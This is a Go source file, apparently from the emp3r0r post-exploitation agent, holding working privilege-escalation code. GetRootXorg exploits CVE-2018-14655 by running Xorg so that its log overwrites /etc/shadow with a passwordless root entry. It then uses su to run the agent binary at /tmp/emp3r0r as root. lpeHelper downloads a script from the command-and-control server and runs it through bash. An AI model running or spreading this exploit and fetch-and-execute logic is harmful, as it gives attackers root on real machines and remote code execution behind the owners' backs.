package agent

import (
	"context"
	"errors"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/creack/pty"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
)

/*
	LPE exploits
*/

// GetRoot all-in-one
func GetRoot() (err error) {
	ctx, cancel := context.WithCancel(context.Background())
	return GetRootXorg(ctx, cancel)
}

// GetRootXorg get root via xorg lpe CVE-2018-14655
func GetRootXorg(ctx context.Context, cancel context.CancelFunc) (err error) {
	var out []byte
	defer func() {
		cancel()
		e := os.Chdir(emp3r0r_data.AgentRoot)
		if e != nil {
			log.Printf("failed to cd back to %s\n%v", emp3r0r_data.AgentRoot, e)
		}
	}()

	if os.Chdir("/etc") != nil {
		return errors.New("Cannot cd to /etc")
	}
	exp := exec.Command("Xorg", "-fp", "root::16431:0:99999:7:::", "-logfile", "shadow", ":1")
	go func() {
		if ctx.Err() != nil {
			return
		}
		out, err = exp.CombinedOutput()
		if err != nil &&
			!strings.Contains(err.Error(), "signal: killed") {
			log.Printf("start xorg: %s\n%v", out, err)
			cancel()
		}
	}()
	time.Sleep(5 * time.Second)
	if ctx.Err() != nil {
		return fmt.Errorf("failed to run Xorg: %s\n%v", out, err)
	}
	if proc := exp.Process; proc != nil {
		err = exp.Process.Kill()
		if err != nil {
			return fmt.Errorf("failed to kill Xorg: %s\n%v", out, err)
		}
	}

	log.Println("GetRootXorg shadow is successfully overwritten")

	su := exec.Command("su", "-c /tmp/emp3r0r")
	_, err = pty.Start(su)
	if err != nil {
		log.Println("Xorg start su in PTY: ", err)
		return
	}

	err = os.Rename("/etc/shadow.old", "/etc/shadow")
	if err != nil {
		log.Println("Restoring shadow: ", err)
		return
	}
	log.Println("GetRootXorg exited without error")

	return
}

// lpeHelper runs les and upc to suggest LPE methods
func lpeHelper(method string) string {
	log.Printf("Downloading lpe script from %s", emp3r0r_data.CCAddress+method)
	var scriptData []byte
	scriptData, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/"+method, "")
	if err != nil {
		return "LPE error: " + err.Error()
	}

	// run the script
	log.Println("Running LPE suggest")
	cmd := exec.Command("/bin/bash", "-c", string(scriptData))
	if method == "lpe_lse" {
		cmd = exec.Command("/bin/bash", "-c", string(scriptData), "-i")
	}

	outBytes, err := cmd.CombinedOutput()
	if err != nil {
		return "LPE error: " + string(outBytes)
	}

	return string(outBytes)
}
